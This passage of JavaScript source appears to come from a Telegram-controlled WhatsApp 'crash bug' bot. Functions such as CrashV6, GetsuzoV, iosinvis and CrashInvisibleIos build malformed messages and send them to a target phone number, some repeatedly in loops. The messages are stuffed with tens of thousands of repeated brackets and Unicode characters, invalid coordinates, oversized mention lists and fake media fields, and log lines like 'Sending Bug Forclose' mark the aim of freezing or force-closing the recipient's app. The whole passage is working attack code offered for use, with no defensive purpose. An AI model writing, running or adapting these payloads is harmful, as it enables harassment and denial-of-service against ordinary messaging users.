        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: sock.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await sock.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝗣𝗛𝗢𝗘𝗡𝗜𝗫 •𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ Getsuzo Companyཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ Getsuzo Companyཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}

async function CrashV6(target) {
  const channelId = "120363405047659387@newsletter";
  try {
    const PEPEK = {
      groupStatusMentionMessage: {
        message: {
          imageMessage: {
            url: "https://files.catbox.moe/msu4dk.jpg",
            mimetype: "image/jpeg",
             caption: "",
          },
          contextInfo: {
            externalAdReply: {
              title: "",
              body: "",
              mediaType: 1,
              thumbnail: Buffer.from(""),
              sourceUrl: "",
            },
            isForwarded: true,
            forwardingScore: 99999,
          }
        }
      }
    };

    await sock.relayMessage(target, PEPEK);

    console.log(``);
  } catch (err) {
    console.error(err);
  }
}

async function GetsuzoV(target) {
const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  for (let renz = 0; renz < 15; renz++) {
    const msg = await generateWAMessageFromContent(target, {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 2,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "\n".repeat(900),
              hasMediaAttachment: false,
              audioMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "audio/mpeg",
                directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1750124469",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                contextInfo: {
                  mentionedJid: [target],
                  participant: target,
                  remoteJid: target,
                  expiration: 9741,
                  ephemeralSettingTimestamp: 9741,
                  disappearingMode: {
                    initiator: "INITIATED_BY_OTHER",
                    trigger: "ACCOUNT_SETTING"
                  }
                },
                scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                scanLengths: [1000, 2000, 3000, 4000],
                midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
              }
            },
            body: {
              text: "\n".repeat(900),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000)
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      additionalNodes: Node,
      messageId: msg.key.id
    });
  }
 
  for (let j = 0; j < 15; j++) {  
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "\n".repeat(900),
                address: "\n".repeat(900),
              },
            },
            body: {
              text: "\n\n".repeat(800),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg. message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}  
  console.log("Sending Bug Forclose");
}

async function iosinvis(target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "Getsuzo" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "Getsuzo" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://renz.example.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "GetsuzoCompany.ID‼️",
            matchedText: "https://t.me/RapzXyzz",
            description: "than xs".repeat(15000),
            title: "Getsuzo" + "Getsuzo".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function DelayMaker(target) {
 for (let i = 0; i < 2; i++) {
  await Invisible(target)
  await sleep(2000);
 }
}

async function force(target) {
for (let i = 0; i < 2; i++) {
await GetsuzoV(target)
await sleep(1000);
 }
}

async function CrashInvisibleIos(target) {
for (let i = 0; i < 50; i++) {
await iosinvis(target)
await sleep(1000);
}
}
let BOT_NAME = "@HackGg_Bot";

bot.telegram.getMe().then((botInfo) => {
  BOT_NAME = botInfo.first_name; // Nama tampilan bot
});


bot.launch();
startSesi();
